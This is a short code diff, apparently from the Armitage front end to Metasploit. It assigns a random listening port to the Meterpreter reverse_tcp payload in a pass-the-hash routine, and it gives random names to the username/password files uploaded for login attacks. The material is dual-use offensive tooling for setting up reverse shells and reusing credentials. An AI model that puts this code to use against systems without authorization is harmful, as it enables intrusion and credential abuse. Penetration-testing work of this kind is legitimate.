@@ -194,6 +194,7 @@ sub pass_the_hash {
 				if ([$reverse isSelected]) {
 					%options["LHOST"] = $MY_ADDRESS;
 					%options["PAYLOAD"] = "windows/meterpreter/reverse_tcp";
+					%options["LPORT"] = randomPort();
 				}
 				else if (isIPv6($host)) {
 					%options["PAYLOAD"] = "windows/meterpreter/bind_ipv6_tcp";
@@ -291,8 +292,10 @@ sub show_login_dialog {
 }
 
 sub createUserPassFile {
-	local('$handle $user $pass $type $row $2');
-	$handle = openf(">userpass.txt");
+	local('$handle $user $pass $type $row $2 $name');
+	$name = "userpass" . rand(10000) . ".txt";
+
+	$handle = openf("> $+ $name");
 	foreach $row ($1) {
 		($user, $pass, $type) = values($row, @("user", "pass", "ptype"));
 		if ($type eq "password" || $type eq $2) {
@@ -306,12 +309,12 @@ sub createUserPassFile {
 
 	if ($client !is $mclient) {
 		local('$file');
-		$file = uploadFile("userpass.txt");
-		deleteOnExit("userpass.txt");
+		$file = uploadFile($name);
+		deleteOnExit($name);
 		return $file;
 	}
 	else {
-		return getFileProper("userpass.txt");
+		return getFileProper($name);
 	}
 }
 
